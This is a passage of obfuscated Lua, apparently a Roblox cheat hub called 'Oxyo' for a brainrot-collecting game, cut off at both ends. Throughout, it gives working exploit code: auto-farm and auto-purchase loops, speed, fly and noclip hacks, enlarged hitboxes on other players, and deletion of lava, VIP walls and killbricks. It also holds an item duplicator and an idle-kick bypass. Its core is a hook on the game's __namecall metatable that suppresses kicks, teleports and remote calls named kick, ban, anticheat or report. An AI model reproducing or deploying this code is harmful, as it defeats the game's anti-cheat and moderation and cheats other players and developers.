table.insert(v515,v517.OnClientEvent:Connect(function(v1778) if ((type(v1778)=="string") and (v1778~="") and (v514=="")) then v514=v1778;end end));end if (v504:sub(1,3)=="LB_") then local v1293=v505.displayName:match("^(.+) Lucky Block$") or "" ;local v1294={v1293   .. " Lucky Block (World)" ,v1293   .. " Lucky Block" ,v1293   .. " LuckyBlock" ,v1293   .. "LuckyBlock" ,v1293   .. " Lucky Block World" ,(v1293   .. " Lucky Block (World)"):lower(),(v1293   .. " Lucky Block"):lower(),(v1293   .. " LuckyBlock"):lower(),v1293:lower()   .. "_lucky_block" ,v1293:lower()   .. "luckyblock" ,"Purchase "   .. v1293   .. " Lucky Block" ,"Buy "   .. v1293   .. " Lucky Block" ,"Lucky Block "   .. v1293 ,("Lucky Block "   .. v1293):lower(),v505.serverKey,v505.serverKey:lower()};local v1295={};for v1779,v1780 in ipairs(v1294) do if ((v1780~="") and  not v1295[v1780]) then v1295[v1780]=true;pcall(function() v506:FireServer(v1780);end);task.wait(0.05);end end else pcall(function() v506:FireServer(v507);end);end local v518=0;while (v518<5) and  not v513 and (v514=="")  do task.wait(0.2);v518+=0.2 local function v841(v1296) if  not v1296 then return;end for v1781,v1782 in pairs(v1296:GetChildren()) do if (v1782:IsA("Tool") and  not v509[v1782]) then v513=true;end end end v841(v511);v841(v512);end for v842,v843 in pairs(v515) do pcall(function() v843:Disconnect();end);end if v513 then v163[v505.displayName:lower()]=v507;v38:Notify({Title="✅ Purchased!",Content=v505.displayName,Duration=3,Image=4483362458});return v153.SUCCESS;end if ((v505.coinPrice>0) and (v166()<v508)) then v163[v505.displayName:lower()]=v507;v38:Notify({Title="✅ Purchased!",Content=v505.displayName,Duration=3,Image=4483362458});return v153.SUCCESS;end local v519=v514:lower();if (v519:find("out of stock") or v519:find("sold out") or (v519:find("out") and v519:find("stock"))) then v159(v505.displayName,false,0,true);v159(v505.serverKey,false,0,true);return v153.OUT_OF_STOCK;elseif (v519:find("not enough") or v519:find("afford") or (v519:find("coin") and  not v519:find("stock"))) then return v153.NO_COINS;elseif (v519:find("success") or v519:find("purchas") or v519:find("bought")) then v163[v505.displayName:lower()]=v507;v38:Notify({Title="✅ Purchased!",Content=v505.displayName,Duration=3,Image=4483362458});return v153.SUCCESS;end if ((v505.coinPrice==0) and (v514=="") and (v504:sub(1,3)~="LB_")) then v163[v505.displayName:lower()]=v507;v38:Notify({Title="✅ Purchased!",Content=v505.displayName,Duration=3,Image=4483362458});return v153.SUCCESS;end return v153.NOT_IN_SHOP;end local function v169(v520) if  not v520 then return;end local function v521() if (v520.Health<=0) then return;end v520:SetStateEnabled(Enum.HumanoidStateType.Jumping,true);if ( not v46.jumpEnabled and (v520.JumpPower<=0)) then v520.JumpPower=50;end end v521();v520:GetPropertyChangedSignal("JumpPower"):Connect(v521);end v40.CharacterAdded:Connect(function(v522) v41=v522;v42=v522:WaitForChild("Humanoid");v43=v522:WaitForChild("HumanoidRootPart");v46.grabLock=false;v46.grabLockTime=0;v26.flush("RarityDir");v26.del("MyPlot");v26.del("SubmitPart");v26.del("Brainrots");v26.del("Plots");v25.clear("char");task.wait(0.5);if v42 then v169(v42);if v46.speedEnabled then v42.WalkSpeed=v46.currentSpeed;end if v46.jumpEnabled then v42.JumpPower=v46.currentJumpPower;end end if v46.flyEnabled then task.wait(0.3);v102();end if v46.noclipEnabled then for v1784,v1785 in pairs(v522:GetDescendants()) do if v1785:IsA("BasePart") then v1785.CanCollide=false;end end end if v46.lavaRemoved then v46.lavaRemoved=false;task.wait(0.3);v72();end if getgenv().OxyoVolcanoAutoSubmitOnArrival then getgenv().OxyoVolcanoAutoSubmitOnArrival=false;task.delay(3,function() pcall(function() v38:Notify({Title="🌋 Auto Submit",Content="Arrived! Activating Auto Volcano Submit...",Duration=3,Image=4483362458});v46.volcanoEnabled=true;local v2033=v38 and v38.Flags and v38.Flags['AutoVolcano'] ;if v2033 then v2033:Set(true);end end);end);end if (v46.collectorRunning and v46.selectedRarities and ( #v46.selectedRarities>0)) then task.wait(1.2);if v46.collectorRunning then v81.stop();task.wait(0.15);v81.start(v46.selectedRarities);end end if (v46.autoNameEnabled and (v46.farmByNameFilter~="")) then task.wait(1);if v46.autoNameEnabled then if v46.autoNameThread then pcall(task.cancel,v46.autoNameThread);v46.autoNameThread=nil;end v46.autoNameThread=task.spawn(function() while v46.autoNameEnabled do if v46.grabLock then task.wait(0.2);continue;end local v2364=v50.brainrots;local v2365=false;for v2428,v2429 in ipairs(v2364) do if  not v46.autoNameEnabled then break;end if v46.grabLock then break;end if (v2429.obj and v2429.obj.Parent and v87(v2429.obj)) then v2365=true;local v2527=v2429;local v2528,v2529=pcall(v81.grab,v2527.obj);if (v2528 and v2529) then pcall(v81.submit);end task.wait(0.5);break;end end if  not v2365 then task.wait(1);end end end);end end v99();end);pcall(function() if v42 then v169(v42);end end);v3.JumpRequest:Connect(function() pcall(function() local v844=v40.Character and v40.Character:FindFirstChildOfClass("Humanoid") ;if ( not v844 or (v844.Health<=0)) then return;end v844:SetStateEnabled(Enum.HumanoidStateType.Jumping,true);if v46.infinityJumpEnabled then v844:ChangeState(Enum.HumanoidStateType.Jumping);end end);end);v97();v99();task.spawn(function() task.wait(30);while true do task.wait(20);pcall(function() if  not v50.isRunning then v50.isRunning=false;v97();end if (v46.collectorRunning and  not v81.isActive()) then if (v46.selectedRarities and ( #v46.selectedRarities>0)) then v81.start(v46.selectedRarities);end end if (v46.autoNameEnabled and  not v46.autoNameThread and (v46.farmByNameFilter~="")) then v46.autoNameThread=task.spawn(function() while v46.autoNameEnabled do if v46.grabLock then task.wait(0.15);continue;end local v2366=false;for v2430,v2431 in ipairs(v50.brainrots) do if  not v46.autoNameEnabled then break;end if (v2431.obj and v2431.obj.Parent and v87(v2431.obj)) then v2366=true;local v2530,v2531=pcall(v81.grab,v2431.obj);if (v2530 and v2531) then pcall(v81.submit);end task.wait(0.4);break;end end if  not v2366 then task.wait(0.8);end end end);end if (v129.active and  not v129.thread) then v129.thread=task.spawn(v129.loopFn);end if (v46.volcanoEnabled and  not v46.volcanoThread) then v38:Notify({Title="🌋 Volcano",Content="Watchdog: restarting...",Duration=3,Image=4483362458});v46.volcanoThread=task.spawn(function() while v46.volcanoEnabled do local v2367,v2368=getRequiredVolcanoBrainrot();if  not v2367 then task.wait(3);continue;end local v2369=findVolcanoTarget(v2367,v2368);if  not v2369 then task.wait(3);continue;end pcall(v82,v2369);task.wait(0.4);pcall(submitToVolcano);task.wait(1);end end);end end);end end);task.spawn(function() while true do task.wait(3);if (v46.grabLock and ((tick() -v46.grabLockTime)>6)) then v46.grabLock=false;v46.grabLockTime=0;end end end);do local v525={};local v526=nil;task.spawn(function() while true do task.wait(0.4);if  not v46.noclipEnabled then continue;end local v1302=v40.Character;if  not v1302 then continue;end if (v1302~=v526) then v526=v1302;v525={};for v2211,v2212 in ipairs(v1302:GetDescendants()) do if v2212:IsA("BasePart") then table.insert(v525,v2212);end end end for v1788,v1789 in ipairs(v525) do if (v1789 and v1789.Parent) then v1789.CanCollide=false;end end end end);end task.spawn(function() while true do task.wait(0.4);if ( not v46.speedEnabled and  not v46.jumpEnabled) then continue;end pcall(function() local v1303=v40.Character and v40.Character:FindFirstChild("Humanoid") ;if  not v1303 then return;end if (v46.speedEnabled and (v1303.WalkSpeed~=v46.currentSpeed)) then v1303.WalkSpeed=v46.currentSpeed;end if (v46.jumpEnabled and (v1303.JumpPower~=v46.currentJumpPower)) then v1303.JumpPower=v46.currentJumpPower;end end);end end);task.spawn(function() while true do task.wait(0.4);if  not v46.hitboxEnabled then continue;end for v1304,v1305 in ipairs(v0:GetPlayers()) do if (v1305==v40) then continue;end pcall(function() local v1790=v1305.Character and v1305.Character:FindFirstChild("HumanoidRootPart") ;if  not v1790 then return;end if (v1790.Size.X~=v46.hitboxSize) then v1790.Size=Vector3.new(v46.hitboxSize,v46.hitboxSize,v46.hitboxSize);v1790.Transparency=v46.hitboxTransp;v1790.BrickColor=v46.hitboxColor;v1790.Material=Enum.Material.Neon;v1790.CanCollide=false;end end);end end end);do local v527=tick();if (getgenv().OxyoAutoSafe==nil) then getgenv().OxyoAutoSafe=true;end local function v528() if  not getgenv().OxyoAutoSafe then return;end pcall(function() v7:CaptureController();v7:ClickButton2(Vector2.new());end);pcall(function() game:GetService("GuiService").SelectedObject=nil;end);v527=tick();end v25.add(v0.LocalPlayer.Idled:Connect(function() v528();end),"antiafk");local function v529() return v129.active or getgenv().OxyoAutoHopCoin or getgenv().OxyoAutoHopGodly or getgenv().OxyoAutoHopCel or getgenv().OxyoAutoHopFrag ;end task.spawn(function() while true do local v1308=(v529() and 18) or 52 ;task.wait(v1308);if ((tick() -v527)>=v1308) then v528();end end end);end if v18 then task.defer(function() pcall(function() local v1791=getrawmetatable(game);local v1792=rawget(v1791,"__namecall");if  not v1792 then return;end local v1793={kick=true,ban=true,anticheat=true,cheat=true,exploit=true,hack=true,flag=true,suspend=true,report=true,detect=true,punish=true,terminate=true,sanction=true,infraction=true,violation=true,blacklist=true,cheatdetect=true,hackdetect=true};setreadonly(v1791,false);v1791.__namecall=newcclosure(function(v2043,...) if ((typeof(checkcaller)=="function") and checkcaller()) then return v1792(v2043,...);end local v2044,v2045=pcall(getnamecallmethod);if  not v2044 then return v1792(v2043,...);end if (v2045=="Kick") then return;end if ((v2045=="TeleportAsync") or (v2045=="TeleportToPlaceInstance") or (v2045=="TeleportToSpawnByName")) then if ((typeof(checkcaller)=="function") and  not checkcaller()) then local v2489={...};if (v2489[1] and (tostring(v2489[1])~=tostring(v21))) then return;end end end if ((v2045=="FireServer") or (v2045=="InvokeServer") or (v2045=="FireClient") or (v2045=="FireAllClients")) then local v2370={...};if (typeof(v2370[1])=="string") then local v2490=v2370[1]:lower():gsub("[%s%-_]","");if v1793[v2490] then return;end for v2532 in pairs(v1793) do if (v2490:find(v2532,1,true) and ( #v2490<( #v2532 + 6))) then return;end end end end return v1792(v2043,...);end);setreadonly(v1791,true);end);end);end local v170={};local function v171(v530) if v170[v530] then return;end v170[v530]=true;v530.OnClientEvent:Connect(function(v845) if (type(v845)~="string") then return;end local v846=v845:lower();if (v846:find("coin") and (v846:find("rain") or v846:find("start") or v846:find("event"))) then local v1795=v845:match("(%d+)");v46.coinEventDuration=tonumber(v1795) or 90 ;if (v46.autoCoinEnabled and  not v105.isActive()) then v38:Notify({Title="Coin Rain!",Content="Started — farming!",Duration=3,Image=4483362458});v10("🪙 Coin Rain Started!","Event started!",16766720);v113();end end end);end task.spawn(function() local v532={{"Events","Notification"},{"Remotes","Notification"},{"Events","CoinRain"},{"Remotes","CoinRain"},{"Events","SystemNotification"},{"Remotes","SystemNotification"}};for v847,v848 in ipairs(v532) do pcall(function() local v1309=v4;for v1797=1, #v848-1  do local v1798=v1309:FindFirstChild(v848[v1797]) or v1309:WaitForChild(v848[v1797],3) ;if  not v1798 then return;end v1309=v1798;end local v1310=v1309:FindFirstChild(v848[ #v848]);if (v1310 and v1310:IsA("RemoteEvent")) then v171(v1310);end end);end end);task.spawn(function() task.wait(3.5);while true do task.wait(3);if (v46.autoCoinEnabled and  not v110) then local v1799=v108();if (( #v1799>=2) and  not v105.isActive()) then v46.coinEventDuration=90;v38:Notify({Title="Coin Rain!",Content="Detected "   ..  #v1799   .. " coins!" ,Duration=3,Image=4483362458});v10("🪙 Coin Rain!","Detected **"   ..  #v1799   .. "** coins in server!" ,16766720);v113();elseif (v105.isActive() and  not v112 and  not v110) then v113();end end end end);v55:CreateSection("Remove Objects");local v172=nil;v55:CreateToggle({Name="🌋 Remove Lava",CurrentValue=false,Flag="RemoveLava",Callback=function(v533) if v533 then for v1800,v1801 in ipairs(workspace:GetDescendants()) do if ((v1801.Name=="Lavas") or (v1801.Name=="Lava")) then pcall(function() v1801:Destroy();end);end end v46.lavaRemoved=true;if v172 then v172:Disconnect();end v172=workspace.DescendantAdded:Connect(function(v1802) if ((v1802.Name=="Lavas") or (v1802.Name=="Lava")) then task.defer(function() pcall(function() v1802:Destroy();end);end);end end);v38:Notify({Title="🌋 Remove Lava",Content="ON — lava removed.",Duration=3,Image=4483362458});else if v172 then v172:Disconnect();v172=nil;end v46.lavaRemoved=false;v38:Notify({Title="🌋 Remove Lava",Content="OFF — lava returns next round.",Duration=3,Image=4483362458});end end});v55:CreateButton({Name="Remove VIP Walls",Callback=function() for v849,v850 in pairs(workspace:GetDescendants()) do if ((v850.Name=="VIPDoors") or (v850.Name=="VIPDoor") or (v850.Name=="VIPWall")) then pcall(function() v850:Destroy();end);end end end});v55:CreateButton({Name="Remove Killbricks",Callback=function() for v851,v852 in pairs(workspace:GetDescendants()) do if v852:IsA("BasePart") then local v1803=v852.Name:lower();if (v1803:find("kill") or v1803:find("damage") or v1803:find("death") or v1803:find("void") or v1803:find("lava") or (v852.BrickColor==BrickColor.new("Really red"))) then pcall(function() v852:Destroy();end);end end end end});v55:CreateSection("My Plot");v55:CreateButton({Name="Teleport to My Plot",Callback=function() local v534=v69();if  not v534 then v38:Notify({Title="Plot",Content="Could not find your plot.",Duration=3,Image=4483362458});end end});v55:CreateSection("Utilities");v55:CreateButton({Name="Reset Config",Callback=function() local v535={"InstantGrab","NoClip","SpeedEnabled","JumpEnabled","InfinityJump","AutoMeteor","AutoLuckyBlock","AutoSpinWheel","AutoFarmToggle","AutoFarmNameToggle","AutoMoney","AutoCoin","AutoHopCoin","AutoUpgrade","AutoSell","MutationAlert","AutoBuyGear","AutoBuyLB","HitboxToggle","FullBright","InfiniteZoom","PlayerESP","CelestialESP"};local v536={SpeedSlider=16,JumpSlider=50,FlySpeed=1,MaxCarrySlider=1,SellThreshold=50,SellTimerInterval=0,HitboxSize=50,HitboxTransp=7,FragUpgradeSecs=50};local v537={RarityDropdown={},MutationDropdown={},TraitDropdown={},LuckyBlockType={"All"},LuckyTraitDropdown={},HitboxColor={"Really blue"},GearDropdown={},GearMultiDropdown={},MutationAlertDropdown={}};for v853,v854 in ipairs(v535) do pcall(function() if v38.Flags[v854] then v38.Flags[v854]:Set(false);end end);end for v855,v856 in pairs(v536) do pcall(function() if v38.Flags[v855] then v38.Flags[v855]:Set(v856);end end);end for v857,v858 in pairs(v537) do pcall(function() if v38.Flags[v857] then v38.Flags[v857]:Set(v858);end end);end pcall(function() v38:ResetConfiguration();end);v38:Notify({Title="Config Reset",Content="All settings reset to default.",Duration=3,Image=4483362458});end});v55:CreateButton({Name="Rejoin Server",Callback=function() task.wait(1);v118(game.JobId);end});v55:CreateButton({Name="Server Hop",Callback=function() task.wait(1);v118(nil);end});v55:CreateSection("Instant Grab");v55:CreateToggle({Name="Instant Grab",CurrentValue=false,Flag="InstantGrab",Callback=function(v538) v46.instantGrabEnabled=v538;if v538 then for v1804,v1805 in ipairs(workspace:GetDescendants()) do if v1805:IsA("ProximityPrompt") then if  not v46.OriginalHoldTimes[v1805] then v46.OriginalHoldTimes[v1805]=v1805.HoldDuration;end v1805.HoldDuration=0;end end v46.instantGrabConnection=workspace.DescendantAdded:Connect(function(v1806) if v1806:IsA("ProximityPrompt") then if  not v46.OriginalHoldTimes[v1806] then v46.OriginalHoldTimes[v1806]=v1806.HoldDuration;end v1806.HoldDuration=0;end end);else if v46.instantGrabConnection then v46.instantGrabConnection:Disconnect();v46.instantGrabConnection=nil;end for v1807,v1808 in pairs(v46.OriginalHoldTimes) do if (v1807 and v1807.Parent) then v1807.HoldDuration=v1808;end end v46.OriginalHoldTimes={};end end});v55:CreateSection("Movement");v55:CreateToggle({Name="NoClip",CurrentValue=false,Flag="NoClip",Callback=function(v540) v46.noclipEnabled=v540;end});v55:CreateSection("Player");v55:CreateToggle({Name="Speed On/Off",CurrentValue=false,Flag="SpeedEnabled",Callback=function(v542) v46.speedEnabled=v542;pcall(function() if (v41 and v41:FindFirstChild("Humanoid")) then if v46.speedEnabled then v46.originalSpeed=v41.Humanoid.WalkSpeed;v41.Humanoid.WalkSpeed=v46.currentSpeed;else v41.Humanoid.WalkSpeed=v46.originalSpeed or v44() ;v46.originalSpeed=nil;end end end);end});v55:CreateSlider({Name="Walk Speed",Range={16,200},Increment=1,Suffix="Speed",CurrentValue=16,Flag="SpeedSlider",Callback=function(v544) v46.currentSpeed=v544;if v46.speedEnabled then pcall(function() if (v41 and v41:FindFirstChild("Humanoid")) then v41.Humanoid.WalkSpeed=v46.currentSpeed;end end);end end});v55:CreateToggle({Name="Jump Power On/Off",CurrentValue=false,Flag="JumpEnabled",Callback=function(v546) v46.jumpEnabled=v546;pcall(function() if (v41 and v41:FindFirstChild("Humanoid")) then if v46.jumpEnabled then v46.originalJump=v41.Humanoid.JumpPower;v41.Humanoid.JumpPower=v46.currentJumpPower;else v41.Humanoid.JumpPower=v46.originalJump or v45() ;v46.originalJump=nil;end end end);end});v55:CreateSlider({Name="Jump Power",Range={50,300},Increment=1,Suffix="Power",CurrentValue=50,Flag="JumpSlider",Callback=function(v548) v46.currentJumpPower=v548;if v46.jumpEnabled then pcall(function() if (v41 and v41:FindFirstChild("Humanoid")) then v41.Humanoid.JumpPower=v46.currentJumpPower;end end);end end});v55:CreateToggle({Name="Infinity Jump",CurrentValue=false,Flag="InfinityJump",Callback=function(v550) v46.infinityJumpEnabled=v550;end});v55:CreateSection("Fly");v55:CreateToggle({Name="Enable Fly  (Q = Up | E = Down)",CurrentValue=false,Callback=function(v552) v46.flyEnabled=v552;if v552 then v102();else v103();end end});v55:CreateSlider({Name="Fly Speed",Range={1,10},Increment=1,Suffix="x",CurrentValue=1,Flag="FlySpeed",Callback=function(v554) v46.speeds=v554;end});v55:CreateSection("Duplicate Brainrot");v55:CreateButton({Name="Duplicate Equipped Brainrot",Callback=function() local v556,v557=v143();v38:Notify({Title="Duplicate",Content=v557,Duration=3,Image=4483362458});end});v56:CreateSection("Auto Meteor");(function() v56:CreateToggle({Name="Auto Teleport to Meteor",CurrentValue=false,Flag="AutoMeteor",Callback=function(v859) v51.meteorEnabled=v859;if v859 then v72();v51.meteorThread=task.spawn(function() while v51.meteorEnabled do pcall(function() local v2371=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v2371 then return;end local v2372,v2373=nil,math.huge;for v2436,v2437 in ipairs(workspace:GetChildren()) do if (v2437.Name=="Meteor") then local v2533=v2437.PrimaryPart or v2437:FindFirstChildWhichIsA("BasePart") ;if v2533 then local v2573=(v2533.Position-v2371.Position).Magnitude;if (v2573<v2373) then v2372=v2533;v2373=v2573;end end end end if v2372 then local v2491=v2372.AssemblyLinearVelocity;local v2492=v2372.Position;local v2493;if (v2491 and (v2491.Y< -1)) then local v2560=math.max(0,(v2492.Y-5)/ -v2491.Y );v2493=Vector3.new(v2492.X + (v2491.X * v2560) ,5,v2492.Z + (v2491.Z * v2560) );else v2493=Vector3.new(v2492.X,v2492.Y + 3 ,v2492.Z);end v2371.CFrame=CFrame.new(v2493);end end);task.wait(0.35);end end);elseif v51.meteorThread then pcall(task.cancel,v51.meteorThread);v51.meteorThread=nil;end end});v56:CreateSection("Auto Lucky Block");local v558={"All"};for v861,v862 in ipairs(v53) do if (v862~="LuckyBlock") then table.insert(v558,v862);end end v56:CreateDropdown({Name="Block Type",Options=v558,CurrentOption={"All"},Flag="LuckyBlockType",Callback=function(v863) v51.luckyType=((type(v863)=="table") and v863[1]) or v863 ;end});v56:CreateDropdown({Name="Trait Filter  (empty = all)",Options=v48,CurrentOption={},MultipleOptions=true,Flag="LuckyTraitDropdown",Callback=function(v865) v51.luckyTraits=v865;end});v56:CreateToggle({Name="Auto Lucky Block",CurrentValue=false,Flag="AutoLuckyBlock",Callback=function(v867) v51.luckyEnabled=v867;if v867 then v72();local v1810=workspace:FindFirstChild("GameFolder");local v1811=v1810 and v1810:FindFirstChild("LuckyBlocks") ;if  not v1811 then v38:Notify({Title="Auto Lucky Block",Content="LuckyBlocks folder not found!",Duration=4,Image=4483362458});v51.luckyEnabled=false;return;end for v2047,v2048 in ipairs(v1811:GetChildren()) do task.spawn(v152,v2048);end if v51.luckyConn then v51.luckyConn:Disconnect();end v51.luckyConn=v1811.ChildAdded:Connect(function(v2049) if v51.luckyEnabled then task.wait(0.5);task.spawn(v152,v2049);end end);task.spawn(function() while v51.luckyEnabled do task.wait(2);pcall(function() for v2438,v2439 in ipairs(v1811:GetChildren()) do if  not v51.luckyEnabled then break;end local v2440=v2439:FindFirstChildWhichIsA("ProximityPrompt",true);if (v2440 and v148(v2440.Parent.Position) and v150(v2439.Name)) then task.spawn(v152,v2439);end end end);end end);elseif v51.luckyConn then v51.luckyConn:Disconnect();v51.luckyConn=nil;end end});v56:CreateSection("Auto Spin Wheel");v56:CreateToggle({Name="Auto Spin Wheel",CurrentValue=false,Flag="AutoSpinWheel",Callback=function(v869) v51.spinEnabled=v869;if v869 then v51.spinThread=task.spawn(function() while v51.spinEnabled do pcall(function() v4:WaitForChild("Remotes",10):WaitForChild("SpinWheel",10):WaitForChild("RequestSpin",10):FireServer();end);task.wait(0.76);end end);elseif v51.spinThread then pcall(task.cancel,v51.spinThread);v51.spinThread=nil;end end});v56:CreateSection("Filters");v56:CreateDropdown({Name="Select Rarities",Options={"Common","Rare","Epic","Legendary","Mythic","Secret","Celestial","Godly","Forbidden"},CurrentOption={},MultipleOptions=true,Flag="RarityDropdown",Callback=function(v871) v46.selectedRarities=v871;end});v56:CreateDropdown({Name="Select Mutations  (empty = all)",Options={"Gold","Emerald","Diamond","Bloodmoon","Rainbow","Aqua"},CurrentOption={},MultipleOptions=true,Flag="MutationDropdown",Callback=function(v873) v46.selectedMutations=v873;end});v56:CreateDropdown({Name="Select Traits  (empty = all)",Options=v48,CurrentOption={},MultipleOptions=true,Flag="TraitDropdown",Callback=function(v875) v46.selectedTraits=v875;end});v56:CreateSection("Carry Settings");v56:CreateSlider({Name="Max Carry",Range={1,6},Increment=1,Suffix="Brainrots",CurrentValue=1,Flag="MaxCarrySlider",Callback=function(v877) v46.maxCarry=v877;end});v56:CreateSection("Auto Collector");v56:CreateToggle({Name="Start Auto Farm",CurrentValue=false,Flag="AutoFarmToggle",Callback=function(v879) if v879 then task.spawn(function() task.wait(0.3);if  not (v38.Flags['AutoFarmToggle'] and v38.Flags['AutoFarmToggle'].CurrentValue) then return;end if ( #v46.selectedRarities==0) then local v2374=v38.Flags['RarityDropdown'] and v38.Flags['RarityDropdown'].CurrentOption ;if ((type(v2374)=="table") and ( #v2374>0)) then v46.selectedRarities=v2374;end end if ( #v46.selectedRarities==0) then v38:Notify({Title="Auto Farm",Content="Select at least one Rarity first!",Duration=4,Image=4483362458});pcall(function() if v38.Flags['AutoFarmToggle'] then v38.Flags['AutoFarmToggle']:Set(false);end end);return;end v72();local v2050=v31();if v2050 then v147(v2050);end v84(v46.selectedRarities);end);else v85();end end});v56:CreateSection("Farm by Name");v56:CreateInput({Name="Brainrot Name",PlaceholderText="e.g. BrrBrr",RemoveTextAfterFocusLost=false,Flag="FarmByNameInput",Callback=function(v880) v46.farmByNameFilter=v880 or "" ;end});v56:CreateButton({Name="Farm Selected Brainrot  (one pass)",Callback=function() if (v46.farmByNameFilter=="") then v38:Notify({Title="Farm by Name",Content="Type a Brainrot name first!",Duration=4,Image=4483362458});return;end pcall(v95);local v882=false;for v1315,v1316 in ipairs(v50.brainrots) do if (v1316.obj and v1316.obj.Parent and v87(v1316.obj)) then v882=true;v38:Notify({Title="Found!",Content=v1316.name   .. " ("   .. v1316.rarity   .. ") — collecting..." ,Duration=3,Image=4483362458});local v2051=v1316;task.spawn(function() pcall(function() v89(v2051.rarity,v2051.obj);end);end);break;end end if  not v882 then v38:Notify({Title="Not Spawned",Content='\"'   .. v46.farmByNameFilter   .. '\" not found in world.' ,Duration=4,Image=4483362458});end end});v56:CreateToggle({Name="Auto Farm Selected Brainrot  (monitor)",CurrentValue=false,Flag="AutoFarmNameToggle",Callback=function(v883) v46.autoNameEnabled=v883;if v883 then v72();if (v46.farmByNameFilter=="") then v38:Notify({Title="Auto Farm by Name",Content="Type a Brainrot name first!",Duration=4,Image=4483362458});v46.autoNameEnabled=false;pcall(function() if v38.Flags['AutoFarmNameToggle'] then v38.Flags['AutoFarmNameToggle']:Set(false);end end);return;end v46.autoNameThread=task.spawn(function() while v46.autoNameEnabled do if v46.grabLock then task.wait(0.2);continue;end local v2245=v50.brainrots;local v2246=false;for v2375,v2376 in ipairs(v2245) do if  not v46.autoNameEnabled then break;end if v46.grabLock then break;end if (v2376.obj and v2376.obj.Parent and v87(v2376.obj)) then v2246=true;local v2496=v2376;pcall(function() v89(v2496.rarity,v2496.obj);end);task.wait(0.5);break;end end if  not v2246 then task.wait(1);end end end);elseif v46.autoNameThread then pcall(task.cancel,v46.autoNameThread);v46.autoNameThread=nil;end end});v56:CreateSection("Auto Money");v56:CreateToggle({Name="Auto Collect Money",CurrentValue=false,Flag="AutoMoney",Callback=function(v885) v51.moneyEnabled=v885;if v885 then v51.moneyThread=task.spawn(function() while v51.moneyEnabled do pcall(function() local v2377=workspace:FindFirstChild("GameFolder");local v2378=v2377 and v2377:FindFirstChild("Plots") ;if  not v2378 then return;end for v2441,v2442 in pairs(v2378:GetChildren()) do local v2443=v2442:FindFirstChild("Brainrots");if  not v2443 then continue;end for v2497,v2498 in pairs(v2443:GetChildren()) do local v2499,v2500=pcall(function() return v2498:GetAttribute("Owner");end);if (v2499 and v2500 and (tostring(v2500)==tostring(v40.UserId))) then local v2561=v2442:FindFirstChild("Places");if v2561 then for v2582,v2583 in pairs(v2561:GetChildren()) do local v2584=v2583:FindFirstChild("Claim");if (v2584 and v2584:IsA("BasePart")) then local v2585=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if v2585 then v17(v2585,v2584,0);task.wait(0.05);v17(v2585,v2584,1);task.wait(0.1);end end end end break;end end end end);task.wait(3);end end);elseif v51.moneyThread then pcall(task.cancel,v51.moneyThread);v51.moneyThread=nil;end end});v56:CreateSection("Auto Coin");v56:CreateToggle({Name="Auto Collect Coins",CurrentValue=false,Flag="AutoCoin",Callback=function(v887) v46.autoCoinEnabled=v887;if v887 then v72();v106();local v1816=v108();if ( #v1816>=1) then v46.coinEventDuration=90;v38:Notify({Title="Coin Rain!",Content="Coins found — farming!",Duration=3,Image=4483362458});v113();else v38:Notify({Title="Auto Coin",Content="Ready — waiting for Coin Rain...",Duration=3,Image=4483362458});end else v105.stop();v111=false;v112=nil;v107();end end});local v559,v560,v561,v562,v563;(function() v61:CreateSection("🤖 Smart Multi-Hop");v61:CreateParagraph({Title="How it works",Content="Toggle the events you want below.\n\nIf the current server has some (but not all) selected events, it farms the available ones then hops.\nIf all selected events are present it farms all of them then hops.\n\nWebhook is always used to find matching servers. If no match is found it waits until one appears — it will NOT random-hop.\nStop: RightShift or the Stop button."});v61:CreateDropdown({Name="Event Targets",Options={"🔷 Fragments","🌌 Celestial","👑 Godly"},CurrentOption={},MultipleOptions=true,Flag="SHETargetsV2",Callback=function(v1317) v129.sel={};local v1319=((type(v1317)=="table") and v1317) or {v1317} ;local v1320={["🔷 Fragments"]="frag",["🌌 Celestial"]="celestial",["👑 Godly"]="godly"};for v1817,v1818 in ipairs(v1319) do local v1819=v1320[v1818];if v1819 then table.insert(v129.sel,v1819);end end end});v563=v61:CreateToggle({Name="▶  Start Smart Hop",CurrentValue=false,Flag="SHEActive",Callback=function(v1321) if v1321 then local v2052=v141();if  not v2052 then pcall(function() if v563 then v563:Set(false);end end);end else v142();end end});v61:CreateButton({Name="⛔  Stop Smart Hop",Callback=function() v142();pcall(function() if v563 then v563:Set(false);end end);end});function v131() pcall(v142);pcall(function() v81.stop();end);pcall(function() v114.clear();end);pcall(function() v105.stop();end);v46.collectorRunning=false;v111=false;v112=nil;getgenv().OxyoAutoHopCoin=false;getgenv().OxyoHopStopped=true;getgenv().OxyoAutoHopGodly=false;getgenv().OxyoHopGodlyStopped=true;getgenv().OxyoAutoHopCel=false;getgenv().OxyoHopCelStopped=true;getgenv().OxyoAutoHopFrag=false;getgenv().OxyoHopFragStopped=true;getgenv().OxyoExecQueued=false;getgenv().OxyoSHEActive=false;v46.autoHopCoinEnabled=false;v46.autoCoinEnabled=false;v46.autoHopGodlyEnabled=false;v46.autoHopCelEnabled=false;v46.autoHopFragEnabled=false;getgenv().OxyoWWHCoin=false;getgenv().OxyoWWHCoinStop=true;getgenv().OxyoWWHGodly=false;getgenv().OxyoWWHGodlyStop=true;getgenv().OxyoWWHCel=false;getgenv().OxyoWWHCelStop=true;getgenv().OxyoWWHFrag=false;getgenv().OxyoWWHFragStop=true;getgenv().OxyoWWHBR=false;getgenv().OxyoWWHBRStop=true;if v46.wwhCoinThread then pcall(task.cancel,v46.wwhCoinThread);v46.wwhCoinThread=nil;end if v46.wwhGodlyThread then pcall(task.cancel,v46.wwhGodlyThread);v46.wwhGodlyThread=nil;end if v46.wwhCelThread then pcall(task.cancel,v46.wwhCelThread);v46.wwhCelThread=nil;end if v46.wwhFragThread then pcall(task.cancel,v46.wwhFragThread);v46.wwhFragThread=nil;end if v46.wwhBRThread then pcall(task.cancel,v46.wwhBRThread);v46.wwhBRThread=nil;end v107();if v46.autoHopGodlyThread then pcall(task.cancel,v46.autoHopGodlyThread);v46.autoHopGodlyThread=nil;end if v46.autoHopCelThread then pcall(task.cancel,v46.autoHopCelThread);v46.autoHopCelThread=nil;end if v46.autoHopFragThread then pcall(task.cancel,v46.autoHopFragThread);v46.autoHopFragThread=nil;end pcall(function() if (v559 and v559.Set) then v559:Set(false);end end);pcall(function() if (v560 and v560.Set) then v560:Set(false);end end);pcall(function() if (v561 and v561.Set) then v561:Set(false);end end);pcall(function() if (v562 and v562.Set) then v562:Set(false);end end);pcall(function() if (v563 and v563.Set) then v563:Set(false);end end);pcall(function() if v38 then 